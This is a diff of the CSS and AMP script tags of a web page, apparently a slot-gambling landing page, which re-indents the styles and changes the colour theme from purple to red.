+        .i-amphtml-loading-container.amp-hidden {
+          visibility: hidden
+        }
+  
+        .i-amphtml-element>[overflow] {
+          cursor: pointer;
+          position: relative;
+          z-index: 2;
+          visibility: hidden;
+          display: initial;
+          line-height: normal
+        }
+  
+        .i-amphtml-layout-size-defined>[overflow] {
+          position: absolute
+        }
+  
+        .i-amphtml-element>[overflow].amp-visible {
+          visibility: visible
+        }
+  
+        template {
+          display: none !important
+        }
+  
+        .amp-border-box,
+        .amp-border-box *,
+        .amp-border-box :after,
+        .amp-border-box :before {
+          box-sizing: border-box
+        }
+  
+        amp-pixel {
+          display: none !important
+        }
+  
+        amp-analytics,
+        amp-auto-ads,
+        amp-story-auto-ads {
+          position: fixed !important;
+          top: 0 !important;
+          width: 1px !important;
+          height: 1px !important;
+          overflow: hidden !important;
+          visibility: hidden
+        }
+  
+        html.i-amphtml-fie>amp-analytics {
+          position: initial !important
+        }
+  
+        [visible-when-invalid]:not(.visible),
+        form [submit-error],
+        form [submit-success],
+        form [submitting] {
+          display: none
+        }
+  
+        amp-accordion {
+          display: block !important
+        }
+  
+        @media (min-width:1px) {
+          :where(amp-accordion>section)>:first-child {
+            margin: 0;
+            background-color: #efefef;
+            padding-right: 20px;
+            border: 1px solid #dfdfdf
+          }
+  
+          :where(amp-accordion>section)>:last-child {
+            margin: 0
+          }
+        }
+  
+        amp-accordion>section {
+          float: none !important
+        }
+  
+        amp-accordion>section>* {
+          float: none !important;
+          display: block !important;
+          overflow: hidden !important;
+          position: relative !important
+        }
+  
+        amp-accordion,
+        amp-accordion>section {
           margin: 0
         }
-      }
-
-      amp-accordion>section {
-        float: none !important
-      }
-
-      amp-accordion>section>* {
-        float: none !important;
-        display: block !important;
-        overflow: hidden !important;
-        position: relative !important
-      }
-
-      amp-accordion,
-      amp-accordion>section {
-        margin: 0
-      }
-
-      amp-accordion:not(.i-amphtml-built)>section>:last-child {
-        display: none !important
-      }
-
-      amp-accordion:not(.i-amphtml-built)>section[expanded]>:last-child {
-        display: block !important
-      }
-    </style>
-    <script data-auto async src="https://cdn.ampproject.org/v0.mjs" type="module" crossorigin="anonymous"></script>
-    <script async nomodule src="https://cdn.ampproject.org/v0.js" crossorigin="anonymous"></script>
-    <script async src="https://cdn.ampproject.org/v0/amp-carousel-0.1.mjs" custom-element="amp-carousel" type="module" crossorigin="anonymous"></script>
-    <script async nomodule src="https://cdn.ampproject.org/v0/amp-carousel-0.1.js" crossorigin="anonymous" custom-element="amp-carousel"></script>
-    <script async src="https://cdn.ampproject.org/v0/amp-install-serviceworker-0.1.mjs" custom-element="amp-install-serviceworker" type="module" crossorigin="anonymous"></script>
-    <script async nomodule src="https://cdn.ampproject.org/v0/amp-install-serviceworker-0.1.js" crossorigin="anonymous" custom-element="amp-install-serviceworker"></script>
-    <script async src="https://cdn.ampproject.org/v0/amp-youtube-0.1.mjs" custom-element="amp-youtube" type="module" crossorigin="anonymous"></script>
-    <script async nomodule src="https://cdn.ampproject.org/v0/amp-youtube-0.1.js" crossorigin="anonymous" custom-element="amp-youtube"></script>
-    <script async src="https://cdn.ampproject.org/v0/amp-accordion-0.1.mjs" custom-element="amp-accordion" type="module" crossorigin="anonymous"></script>
-    <script async nomodule src="https://cdn.ampproject.org/v0/amp-accordion-0.1.js" crossorigin="anonymous" custom-element="amp-accordion"></script>
-    <style amp-custom>
-      body {
-        -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-        -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-        -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-        animation: -amp-start 8s steps(1, end) 0s 1 normal both
-      }
-
-      @-webkit-keyframes -amp-start {
-        from {
-          visibility: hidden
+  
+        amp-accordion:not(.i-amphtml-built)>section>:last-child {
+          display: none !important
         }
-
-        to {
-          visibility: visible
+  
+        amp-accordion:not(.i-amphtml-built)>section[expanded]>:last-child {
+          display: block !important
         }
-      }
-
-      @-moz-keyframes -amp-start {
-        from {
-          visibility: hidden
+      </style>
+      <script data-auto async src="https://cdn.ampproject.org/v0.mjs" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0.js" crossorigin="anonymous"></script>
+      <script async src="https://cdn.ampproject.org/v0/amp-carousel-0.1.mjs" custom-element="amp-carousel" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0/amp-carousel-0.1.js" crossorigin="anonymous" custom-element="amp-carousel"></script>
+      <script async src="https://cdn.ampproject.org/v0/amp-install-serviceworker-0.1.mjs" custom-element="amp-install-serviceworker" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0/amp-install-serviceworker-0.1.js" crossorigin="anonymous" custom-element="amp-install-serviceworker"></script>
+      <script async src="https://cdn.ampproject.org/v0/amp-youtube-0.1.mjs" custom-element="amp-youtube" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0/amp-youtube-0.1.js" crossorigin="anonymous" custom-element="amp-youtube"></script>
+      <script async src="https://cdn.ampproject.org/v0/amp-accordion-0.1.mjs" custom-element="amp-accordion" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0/amp-accordion-0.1.js" crossorigin="anonymous" custom-element="amp-accordion"></script>
+      <style amp-custom>
+        body {
+          -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+          -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+          -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+          animation: -amp-start 8s steps(1, end) 0s 1 normal both
         }
-
-        to {
-          visibility: visible
+  
+        @-webkit-keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
         }
-      }
-
-      @-ms-keyframes -amp-start {
-        from {
-          visibility: hidden
+  
+        @-moz-keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
         }
-
-        to {
-          visibility: visible
+  
+        @-ms-keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
         }
-      }
-
-      @-o-keyframes -amp-start {
-        from {
-          visibility: hidden
+  
+        @-o-keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
         }
-
-        to {
-          visibility: visible
+  
+        @keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
         }
-      }
-
-      @keyframes -amp-start {
-        from {
-          visibility: hidden
+  
+        html {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          -webkit-text-size-adjust: 100%;
+          -ms-text-size-adjust: 100%
         }
-
-        to {
-          visibility: visible
+  
+        a,
+        body,
+        div,
+        h1,
+        h2,
+        h3,
+        h4,
+        html,
+        p,
+        span {
+          margin: 0;
+          padding: 0;
+          border: 0;
+          font-size: 100%;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          vertical-align: baseline
         }
-      }
-
-      html {
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        -webkit-text-size-adjust: 100%;
-        -ms-text-size-adjust: 100%
-      }
-
-      a,
-      body,
-      div,
-      h1,
-      h2,
-      h3,
-      h4,
-      html,
-      p,
-      span {
-        margin: 0;
-        padding: 0;
-        border: 0;
-        font-size: 100%;
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        vertical-align: baseline
-      }
-
-      a,
-      a:active,
-      a:focus {
-        outline: 0;
-        text-decoration: none
-      }
-
-      a {
-        color: #fff
-      }
-
-      * {
-        padding: 0;
-        margin: 0;
-        -moz-box-sizing: border-box;
-        -webkit-box-sizing: border-box;
-        box-sizing: border-box
-      }
-
-      h1,
-      h2,
-      h3,
-      h4 {
-        margin-top: 0;
-        margin-bottom: .5rem
-      }
-
-      p {
-        margin: 0 0 10px
-      }
-
-      p {
-        margin-top: 0;
-        margin-bottom: 1rem
-      }
-
-      .clear {
-        clear: both
-      }
-
-      .acenter {
-        text-align: center
-      }
-
-      body {
-        background-color: #020202
-      }
-
-      .container {
-        padding-right: 15px;
-        padding-left: 15px;
-        margin-right: auto;
-        margin-left: auto
-      }
-
-      .btn {
-        display: inline-block;
-        padding: 6px 12px;
-        touch-action: manipulation;
-        cursor: pointer;
-        user-select: none;
-        background-image: none;
-        border: 1px solid transparent;
-        border-radius: 5px;
-        font: 250 16px Arial, "Helvetica Neue", Helvetica, sans-serif;
-        width: 100%;
-        color: #fff;
-        text-shadow: 0 0 3px #000;
-        letter-spacing: 1.1px
-      }
-
-      @keyframes blinking {
-        0% {
-          border: 2px solid #fff
+  
+        a,
+        a:active,
+        a:focus {
+          outline: 0;
+          text-decoration: none
         }
-
-        100% {
-          border: 2px solid #b700ff
+  
+        a {
+          color: #fff
         }
-      }
-
-      @media (min-width:768px) {
+  
+        * {
+          padding: 0;
+          margin: 0;
+          -moz-box-sizing: border-box;
+          -webkit-box-sizing: border-box;
+          box-sizing: border-box
+        }
+  
+        h1,
+        h2,
+        h3,
+        h4 {
+          margin-top: 0;
+          margin-bottom: .5rem
+        }
+  
+        p {
+          margin: 0 0 10px
+        }
+  
+        p {
+          margin-top: 0;
+          margin-bottom: 1rem
+        }
+  
+        .clear {
+          clear: both
+        }
+  
+        .acenter {
+          text-align: center
+        }
+  
+        body {
+          background-color: #020202
+        }
+  
         .container {
-          max-width: 720px
+          padding-right: 15px;
+          padding-left: 15px;
+          margin-right: auto;
+          margin-left: auto
         }
+  
+        .btn {
+          display: inline-block;
+          padding: 6px 12px;
+          touch-action: manipulation;
+          cursor: pointer;
+          user-select: none;
+          background-image: none;
 
-        .tron-regis {
-          margin: 0 10px 0 0
+          border: 1px solid transparent;
+          border-radius: 5px;
+          font: 250 16px Arial, "Helvetica Neue", Helvetica, sans-serif;
+          width: 100%;
+          color: #fff;
+          text-shadow: 0 0 3px #000;
+          letter-spacing: 1.1px
         }
-
-        .tron-login {
-          margin: 10px 20px 10px 0
+  
+        @keyframes blinking {
+          0% {
+            border: 2px solid #fff
+          }
+  
+          100% {
+            border: 2px solid #e30707
+          }
         }
-      }
-
-      @media (min-width:992px) {
-        .container {
-          max-width: 960px
+  
+        @media (min-width:768px) {
+          .container {
+            max-width: 720px
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 10px 20px 10px 0
+          }}
+  
+        @media (min-width:992px) {
+          .container {
+            max-width: 960px
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
         }
-
-        .tron-regis {
-          margin: 0 10px 0 0
+  
+        @media (min-width:1200px) {
+          .container {
+            width: 1000px
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
         }
-
-        .tron-login {
-          margin: 0 10px 0 0
+  
+        .row {
+          display: -ms-flexbox;
+          display: flex;
+          -ms-flex-wrap: wrap;
+          flex-wrap: wrap;
+          margin-right: -15px;
+          margin-left: -15px
         }
-      }
-
-      @media (min-width:1200px) {
-        .container {
-          width: 1000px
+  
+        .p-0 {
+          padding: 0
         }
-
-        .tron-regis {
-          margin: 0 10px 0 0
+  
+        .col-md-12,
+        .col-md-4,
+        .col-md-6,
+        .col-md-8,
+        .col-xs-6 {
+          position: relative;
+          width: 100%;
+          padding-right: 15px;
+          padding-left: 15px
         }
-
-        .tron-login {
-          margin: 0 10px 0 0
+  
+        .col-xs-6 {
+          float: left;
+          width: 50%
         }
-      }
-
-      .row {
-        display: -ms-flexbox;
-        display: flex;
-        -ms-flex-wrap: wrap;
-        flex-wrap: wrap;
-        margin-right: -15px;
-        margin-left: -15px
-      }
-
-      .p-0 {
-        padding: 0
-      }
-
-      .col-md-12,
-      .col-md-4,
-      .col-md-6,
-      .col-md-8,
-      .col-xs-6 {
-        position: relative;
-        width: 100%;
-        padding-right: 15px;
-        padding-left: 15px
-      }
-
-      .col-xs-6 {
-        float: left;
-        width: 50%
-      }
-
-      @media (min-width:768px) {
-        .col-md-4 {
-          -ms-flex: 0 0 33.333333%;
-          flex: 0 0 33.333333%;
-          max-width: 33.333333%
+  
+        @media (min-width:768px) {
+          .col-md-4 {
+            -ms-flex: 0 0 33.333333%;
+            flex: 0 0 33.333333%;
+            max-width: 33.333333%
+          }
+  
+          .col-md-6 {
+            -ms-flex: 0 0 50%;
+            flex: 0 0 50%;
+            max-width: 50%
+          }
+  
+          .col-md-8 {
+            -ms-flex: 0 0 66.666667%;
+            flex: 0 0 66.666667%;
+            max-width: 66.666667%
+          }
+  
+          .col-md-12 {
+            -ms-flex: 0 0 100%;
+            flex: 0 0 100%;
+            width: 100%
+          }
+  
+          .logomobi {
+            display: none
+          }
+  
+          .logform {
+            padding-top: 2rem
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
         }
-
-        .col-md-6 {
-          -ms-flex: 0 0 50%;
-          flex: 0 0 50%;
-          max-width: 50%
+  
+        @media (max-width:768px) {
+          .logo {
+            display: none
+          }
+  
+          .navbar {
+            position: fixed
+          }
+  
+          .logomobi {
+            padding-top: 10px;
+            border-bottom: solid #e30707 2px;
+            border-radius: 10px
+          }
+  
+          .content {
+            padding-top: 110px
+          }
+  
+          .logo {
+            display: none
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
         }
-
-        .col-md-8 {
-          -ms-flex: 0 0 66.666667%;
-          flex: 0 0 66.666667%;
-          max-width: 66.666667%
+  
+        .pb-2 {
+          padding-bottom: .5rem
         }
-
-        .col-md-12 {
-          -ms-flex: 0 0 100%;
-          flex: 0 0 100%;
+  
+        .paddy {
+          padding: 15px
+        }
+  
+        .mt-2 {
+          margin-top: .5rem
+        }
+  
+        .mtop {
+          margin-top: .75rem
+        }
+  
+        .mb-3 {
+          margin-bottom: .75rem
+        }
+  
+        .pb-5 {
+          padding-bottom: 1.25rem
+        }
+  
+        .pt-3 {
+          padding-top: 1rem
+        }
+  
+        .navbar {
+          background-color: #000;
+          right: 0;
+          left: 0;
+          z-index: 1030;
+          width: 100%;
+          float: left
+        }
+  
+        .bottom {
+          float: left;
           width: 100%
         }
-
-        .logomobi {
-          display: none
+  
+        ul li {
+          list-style-type: none
         }
-
-        .logform {
-          padding-top: 2rem
+  
+        ul li:last-child {
+          border: 0
         }
-
-        .tron-regis {
-          margin: 0 10px 0 0
+  
+        .copyleft {
+          text-decoration: none;
+          color: #fff;
+          margin: 35px 0
         }
-
-        .tron-login {
-          margin: 0 10px 0 0
+  
+        .copyleft a {
+          color: #e30707
         }
-      }
-
-      @media (max-width:768px) {
-        .logo {
-          display: none
+  
+        .slide {
+          width: 100%;
+          border: 2px solid #e30707;
+          border-radius: 4px;
+          box-shadow: 0 0 3px 0 #e30707;
         }
-
-        .navbar {
-          position: fixed
+  
+        .btn-daf {
+          margin: 30px 0 30px 0;
+          background: linear-gradient(#e30707,#3d0504);
+          animation: blinking 0.5s infinite;
+          transition: all .4s
         }
-
-        .logomobi {
-          padding-top: 10px;
-          border-bottom: solid #b700ff 2px;
-          border-radius: 10px
+  
+        @keyframes blinking {
+          0% {
+            border: 3px solid #ffffff
+          }
+  
+          100% {
+            border: 3px solid #000000
+          }
         }
-
-        .content {
-          padding-top: 110px
+  
+        table.SLOT777 {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          width: 100%;
+          text-align: left;
+          border-collapse: collapse;
+          font-size: calc(8px+1vh);
+          margin: 0 20px 0 0
         }
-
-        .logo {
-          display: none
+  
+        table.SLOT777 td,
+        table.SLOT777 th {
+          border: 1px solid #e30707;
+          padding: 10px 5px 10px
         }
-
-        .tron-regis {
-          margin: 0 10px 0 0
+  
+        table.SLOT777 tbody td {
+          font-size: calc(8px+1vh);
+          font-weight: 500;
+          color: #bfbfbf
         }
-
-        .tron-login {
-          margin: 0 10px 0 0
+  
+        table.SLOT777 thead {
+          background: #e30707
         }
-      }
-
-      .pb-2 {
-        padding-bottom: .5rem
-      }
-
-      .paddy {
-        padding: 15px
-      }
-
-      .mt-2 {
-        margin-top: .5rem
-      }
-
-      .mtop {
-        margin-top: .75rem
-      }
-
-      .mb-3 {
-        margin-bottom: .75rem
-      }
-
-      .pb-5 {
-        padding-bottom: 1.25rem
-      }
-
-      .pt-3 {
-        padding-top: 1rem
-      }
-
-      .navbar {
-        background-color: #000;
-        right: 0;
-        left: 0;
-        z-index: 1030;
-        width: 100%;
-        float: left
-      }
-
-      .bottom {
-        float: left;
-        width: 100%
-      }
-
-      ul li {
-        list-style-type: none
-      }
-
-      ul li:last-child {
-        border: 0
-      }
-
-      .copyleft {
-        text-decoration: none;
-        color: #fff;
-        margin: 35px 0
-      }
-
-      .copyleft a {
-        color: #c2b503
-      }
-
-      .slide {
-        width: 100%;
-        border: 2px solid #b700ff;
-        border-radius: 4px;
-        box-shadow: 0 0 3px 0 #00f
-      }
-
-      .btn-daf {
-        margin: 30px 0 30px 0;
-        background: radial-gradient(circle 214px at 46.5% 54.2%, #b700ff 0, #000 96%);
-        animation: blinking .5s infinite;
-        transition: all .4s
-      }
-
-      @keyframes blinking {
-        0% {
-          border: 3px solid #b700ff
+  
+        table.SLOT777 thead th {
+          font-size: calc(12px+1vh);
+          font-weight: 700;
+          color: #fff;
+          text-align: center;
+          background: linear-gradient(#e30707,#3d0504);
         }
-
-        100% {
-          border: 3px solid #b700ff
+  
+        .main-menu-container {
+          aspect-ratio: 100 / 29;
+          margin: 0 10px 0 10px;
+          display: flex;
+          flex-wrap: wrap;
+          flex-basis: 100%;
+          background-color: #000;
+          color: #fff;
+          padding: 20px
         }
-      }
-
-      table.alojudi {
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        width: 100%;
-        text-align: left;
-        border-collapse: collapse;
-        font-size: calc(8px+1vh);
-        margin: 0 20px 0 0
-      }
-
-      table.alojudi td,
-      table.alojudi th {
-        border: 1px solid #b700ff;
-        padding: 10px 5px 10px
-      }
-
-      table.alojudi tbody td {
-        font-size: calc(8px+1vh);
-        font-weight: 500;
-        color: #bfbfbf
-      }
-
-      table.alojudi thead {
-        background: #b700ff
-      }
-
-      table.alojudi thead th {
-        font-size: calc(12px+1vh);
-        font-weight: 700;
-        color: #fff;
-        text-align: center;
-        background: radial-gradient(circle 214px at 46.5% 54.2%, #b700ff 0, #000 96%)
-      }
-
-      .main-menu-container {
-        aspect-ratio: 100 / 29;
-        margin: 0 10px 0 10px;
-        display: flex;
-        flex-wrap: wrap;
-        flex-basis: 100%;
-        background-color: #000;
-        color: #fff;
-        padding: 20px
-      }
-
-      .main-menu-container ul>li {
-        display: inline;
-        padding: 0 8px
-      }
-
-      .main-menu-container ul>li:last-child {
-        border: 0
-      }
-
-      .main-menu-container>li {
-        flex-basis: 25%;
-        padding: 5px;
-        order: 2
-      }
-
-      .main-menu-container>li:nth-child(-n+4) {
-        order: 0
-      }
-
-      .main-menu-container>li>a {
-        display: block;
-        color: #fff;
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: calc(8px+1vh);
-        font-weight: 500;
-        border: 2px solid #b700ff;
-        border-radius: 5px;
-        padding: 30px;
-        text-align: center;
-        text-transform: uppercase;
-        background-color: #171717;
-        margin: 10px;
-        justify-content: center;
-        line-height: 20px
-      }
-
-      .bank-menu-container {
-        margin: 10px 0 10px 0;
-        display: flex;
-        flex-wrap: wrap;
-        background-color: #000;
-        text-align: center
-      }
-
-      .bank-menu-container>li {
-        flex-basis: 25%;
-        padding: 0 0 0 10px
-      }
-
-      .bank-menu-container>li:nth-child(-n+4) {
-        order: 0
-      }
-
-      .site-description {
-        text-align: left;
-        padding: 10px;
-        color: #b700ff;
-        border-radius: 5px;
-        box-shadow: 0 0 8px 4px #b700ff
-      }
-
-      .site-description hr {
-        margin: 10px 0 10px 0;
-        color: #b700ff;
-        border: 1px solid #b700ff
-      }
-
-      .site-description p {
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: 16px;
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 400;
-        line-height: 23px;
-        padding: 0 10px;
-        color: #fff
-      }
-
-      .site-description li {
-        margin: 5px 30px 10px;
-        text-align: justify;
-        color: #fff
-      }
-
-      .site-description ul>li>a {
-        color: #fff
-      }
-
-      .site-description a {
-        color: #b700ff
-      }
-
-      .site-description h1 {
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: 2em;
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 500;
-        color: #b700ff;
-        margin: 20px 0 20px 0;
-        text-align: center
-      }
-
-      .site-description h2 {
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: 1.5em;
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 500;
-        line-height: 23px;
-        color: #b700ff;
-        margin: 20px 0 20px 0;
-        text-align: center
-      }
-
-      .site-description h3 {
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: 1.25em;
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 500;
-        line-height: 23px;
-        color: #b700ff;
-        margin: 20px 0 20px 0;
-        padding: 10px 10px 10px 10px
-      }
-
-      .site-descriptionh4 {
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: 1em;
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 500;
-        line-height: 23px;
-        color: #b700ff;
-        margin: 20px 0 20px 0;
-        padding: 10px
-      }
-
-      .accordion h4 {
-        background-color: transparent;
-        border: 0
-      }
-
-      .accordion h4 {
-        font-size: 17px;
-        line-height: 28px
-      }
-
-      .accordion h4 i {
-        height: 40px;
-        line-height: 40px;
-        position: absolute;
-        right: 0;
-        font-size: 12px
-      }
-
-      #sub_wrapper {
-        background: #685934;
-        max-width: 650px;
-        position: relative;
-        padding: 10px;
-        border-radius: 4px;
-        margin: 20px auto
-      }
-
-      .tombol_toc {
-        position: relative;
-        outline: 0;
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: calc(12px+1vh);
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 300;
-        line-height: 10px;
-        color: #fff
-      }
-
-      .tombol_toc svg {
-        float: right
-      }
-
-      #daftarisi {
-        background: #262626;
-        padding: 10px 10px 0;
-        border-radius: 4px;
-        margin-top: 10px;
-        -webkit-box-shadow: 0 2px 15px rgba(0, 0, 0, .05);
-        box-shadow: 0 2px 15px rgba(0, 0, 0, .05);
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: calc(8px+1vh);
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 200;
-        line-height: 23px;
-        color: #b700ff
-      }
-
-      #daftarisi a {
-        text-decoration: none;
-        color: #fff
-      }
-
-      #daftarisi ol {
-        padding: 0 0 0 10px;
-        margin: 0
-      }
-
-      #daftarisi ol li.lvl1 {
-        line-height: 1.5em;
-        padding: 4px 0
-      }
-
-      #daftarisi ol li.lvl1:nth-child(n+2) {
-        border-top: 1px dashed #ddd
-      }
-
-      #daftarisi ol li.lvl1 a {
-        font-weight: 600
-      }
-
-      #daftarisi ol li.lvl2 a {
-        font-weight: 300;
-        display: block
-      }
-
-      #daftarisi ul.circle {
-        list-style-type: square;
-        padding: 0 0 0 10px;
-        margin: 0;
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: calc(6px+1vh);
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 200
-      }
-
-      #daftarisi ol li a:hover {
-        text-decoration: underline
-      }
-
-      :target::before {
-        content: "";
-        display: block;
-        height: 40px;
-        margin-top: -40px;
-        visibility: hidden
-      }
-
-      .tron-login {
-        -webkit-border-radius: 0;
-        -moz-border-radius: 0;
-        border-radius: 5px;
-        color: #fff;
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: calc(12px+1vh);
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 700;
-        line-height: 23px;
-        padding: 10px;
-        background-color: #8308f7;
-        -webkit-box-shadow: 1px 1px 15px 0 #e7d805;
-        -moz-box-shadow: 1px 1px 15px 0 #e7d805;
-        box-shadow: 1px 1px 15px 0 #0061f3;
-        border: solid #b700ff 3px;
-        text-decoration: none;
-        display: flex;
-        cursor: pointer;
-        text-align: center;
-        justify-content: center
-      }
-
-      .tron-login:hover {
-        background: #b700ff;
-        border: solid #b700ff 5px;
-        -webkit-border-radius: 0;
-        -moz-border-radius: 0;
-        border-radius: 0;
-        text-decoration: none;
-        color: #fff
-      }
-
-      .tron-regis {
-        -webkit-border-radius: 0;
-        -moz-border-radius: 0;
-        border-radius: 5px;
-        color: #fff;
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: calc(12px+1vh);
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 700;
-        line-height: 23px;
-        padding: 10px;
-        background: radial-gradient(circle 214px at 46.5% 54.2%, #b700ff 0, #000 96%);
-        color: #fff;
-        text-decoration: none;
-        display: flex;
-        cursor: pointer;
-        text-align: center;
-        justify-content: center;
-        margin: 0 10px 0 0
-      }
-
-      .tron-regis:hover {
-        background: #c0bd02;
-        border: solid #b700ff 5px;
-        -webkit-border-radius: 0;
-        -moz-border-radius: 0;
-        border-radius: 0;
-        text-decoration: none
-      }
-
-      .tron {
-        -webkit-border-radius: 0;
-        -moz-border-radius: 0;
-        border-radius: 5px;
-        color: #fff;
-        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        font-size: calc(8px+1vh);
-        font-style: normal;
-        font-variant: normal;
-        font-weight: 300;
-        line-height: 15px;
-        padding: 10px;
-        background: radial-gradient(circle 214px at 46.5% 54.2%, #b700ff 0, #000 96%);
-        -webkit-box-shadow: 1px 1px 10px 0 #c4b105;
-        -moz-box-shadow: 1px 1px 10px 0 #c4b105;
-        box-shadow: 1px 1px 10px 0 #c4b105;
-        border: solid #b700ff 2px;
-        text-decoration: none;
-        display: flex;
-        cursor: pointer;
-        text-align: center;
-        justify-content: center;
-        margin: 10px 0 10px 0
-      }
-
-      .tron:hover {
-        background: #000;
-        border: solid #c9ab06 5px;
-        -webkit-border-radius: 0;
-        -moz-border-radius: 0;
-        border-radius: 0;
-        text-decoration: none
-      }
-
-      .tron-images {
-        -webkit-border-radius: 0;
-        -moz-border-radius: 0;
-        border-radius: 5px;
-        color: #b700ff;
-        -webkit-box-shadow: 1px 1px 10px 0 #b700ff;
-        -moz-box-shadow: 1px 1px 10px 0 #b700ff;
-        box-shadow: 1px 1px 10px 0 #b700ff;
-        display: block;
-        cursor: pointer;
-        text-align: center;
-        justify-content: center;
-        width: 100%;
-        height: auto;
-        margin-right: auto;
-        margin-left: auto
-      }
-
-      .tron-images:hover {
-        background: #000;
-        border: solid #b700ff 1px;
-        -webkit-border-radius: 0;
-        -moz-border-radius: 0;
-        border-radius: 0
-      }
-
-      .wa-gift {
-        position: fixed;
-        width: 44px;
-        display: flex;
-        -webkit-box-align: center;
-        align-items: center;
-        -webkit-box-orient: vertical;
-        -webkit-box-direction: normal;
-        flex-direction: column;
-        -webkit-box-pack: end;
-        justify-content: flex-end;
-        bottom: 160px;
-        right: 20px;
-        z-index: 9
-      }
-
-      .wa-livechat {
-        position: fixed;
-        width: 44px;
-        display: flex;
-        -webkit-box-align: center;
-        align-items: center;
-        -webkit-box-orient: vertical;
-        -webkit-box-direction: normal;
-        flex-direction: column;
-        -webkit-box-pack: end;
-        justify-content: flex-end;
-        bottom: 80px;
-        right: 20px;
-        z-index: 9
-      }
-
-      .spacer {
-        margin: 0 0 30px 0;
-        display: block
-      }
-
-      @media screen and (min-width:701px) {
-        .logomobis {
-          margin-left: 500px;
-          display: none;
+  
+        .main-menu-container ul>li {
+          display: inline;
+          padding: 0 8px
+        }
+  
+        .main-menu-container ul>li:last-child {
+          border: 0
+        }
+  
+        .main-menu-container>li {
+          flex-basis: 25%;
+          padding: 5px;
+          order: 2
+        }
+  
+        .main-menu-container>li:nth-child(-n+4) {
+          order: 0
+        }
+  
+        .main-menu-container>li>a {
+          display: block;
+          color: #fff;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(8px+1vh);
+          font-weight: 500;
+          border: 2px solid #e30707;
+          border-radius: 5px;
+          padding: 30px;
+          text-align: center;
+          text-transform: uppercase;
+          background-color: #171717;
+          margin: 10px;
+          justify-content: center;
